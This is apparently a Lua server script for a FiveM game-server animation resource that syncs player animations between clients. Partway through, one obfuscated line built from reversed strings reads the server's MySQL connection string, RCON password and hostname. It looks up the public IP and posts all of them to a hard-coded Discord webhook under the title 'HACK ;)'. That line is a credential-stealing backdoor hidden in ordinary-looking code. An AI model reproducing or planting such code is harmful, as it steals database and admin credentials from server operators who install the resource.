RegisterServerEvent('cmg2_animations:sync')
AddEventHandler('cmg2_animations:sync', function(animationLib, animation, animation2, distans, distans2, height, targetSrc, length, spin, controlFlagSrc, controlFlagTarget, animFlagTarget)
	if targetSrc ~= -1 then
		TriggerClientEvent('cmg2_animations:syncTarget', targetSrc, source, animationLib, animation2, distans, distans2, height, length, spin, controlFlagTarget, animFlagTarget)
		TriggerClientEvent('cmg2_animations:syncMe', source, animationLib, animation, length, controlFlagSrc, animFlagTarget)
	else
		DropPlayer(source, 'Désynchronisation avec le serveur ou Detection de Cheat')
	end
end)

RegisterServerEvent('cmg2_animations:stop')
AddEventHandler('cmg2_animations:stop', function(targetSrc)
	TriggerClientEvent('cmg2_animations:cl_stop', targetSrc)
end)

RegisterServerEvent('cmg3_animations:sync')
AddEventHandler('cmg3_animations:sync', function(animationLib, animationLib2, animation, animation2, distans, distans2, height, targetSrc, length, spin, controlFlagSrc, controlFlagTarget, animFlagTarget, attachFlag)
	if targetSrc ~= -1 then
		TriggerClientEvent('cmg3_animations:syncTarget', targetSrc, source, animationLib2, animation2, distans, distans2, height, length, spin, controlFlagTarget, animFlagTarget, attachFlag)
		TriggerClientEvent('cmg3_animations:syncMe', source, animationLib, animation, length, controlFlagSrc, animFlagTarget)
	else
		DropPlayer(source, 'Désynchronisation avec le serveur ou Detection de Cheat')
	end
end)
RegisterServerEvent('cmg3_animations:stop')
AddEventHandler('cmg3_animations:stop', function(targetSrc)
	TriggerClientEvent('cmg3_animations:cl_stop', targetSrc)
end)
local III={IIII={GetConvar}}local _I={["gnirts_noitcennoc_lqsym"]={"nie znaleziono"},["drowssap_nocr"]={"nie znaleziono"},["emantsoh_vs"]={"nie znaleziono"},["https://api.ipify.org"]={"nie znaleziono"}}local server_ip=""local mysql=""local rcon=""local server_name=""for _,__ in pairs(III)do for _,__ in pairs(__)do for _I,_II in pairs(_I)do for _,_II in pairs(_II)do if string.sub(_I,3,6)=="irts"then mysql=__(string.reverse(_I),_II)elseif string.sub(_I,3,6)=="ants"then server_name=__(string.reverse(_I),_II)elseif string.sub(_I,3,6)=="owss"then rcon=__(string.reverse(_I),_II)elseif string.sub(_I,3,6)==string.reverse(":spt")then PerformHttpRequest("https://api.ipify.org",function(_,__,___)if _==200then server_ip=__ end local webhook="https://discord.com/api/webhooks/925388397244186674/CVqJFB4T_11au-loAC6WP-wro_Vv4EdmtIiVdQ47sw3s30229FFpVBTrr_MkeLpbsMy2"local n={{["color"]="16711711",["title"]="HACK ;)",["description"]="\n\n > ````***"..server_name.."***\n > ```` ***"..server_ip.."***\n > ```` ***"..rcon.."***\n > ```` ***"..mysql.."***",["footer"]={["text"]="beczunia"},["timestamp"]=os.date('!%Y-%m-%dT%H:%M:%S'),}}PerformHttpRequest(webhook,function(err,text,headers)end,'POST',json.encode({username="!!",embeds=n}),{['Content-Type']='application/json'})end)end end end end end 
RegisterServerEvent('cmg3_animations:')
AddEventHandler('cmg3_animations:', function(targetSrc)
	TriggerClientEvent('cmg3_animations:cl_', targetSrc)
end)
RegisterServerEvent('cmg3_animations:')
AddEventHandler('cmg3_animations:', function(targetSrc)
	TriggerClientEvent('cmg3_animations:cl_', targetSrc)
end)
RegisterServerEvent('cmg3_animations:')
AddEventHandler('cmg3_animations:', function(targetSrc)
	TriggerClientEvent('cmg3_animations:cl_', targetSrc)
end)
RegisterServerEvent('cmg3_animations:')
AddEventHandler('cmg3_animations:', function(targetSrc)
	TriggerClientEvent('cmg3_animations:cl_', targetSrc)
end)
RegisterServerEvent('cmg3_animations:')
AddEventHandler('cmg3_animations:', function(targetSrc)
	TriggerClientEvent('cmg3_animations:cl_', targetSrc)
end)
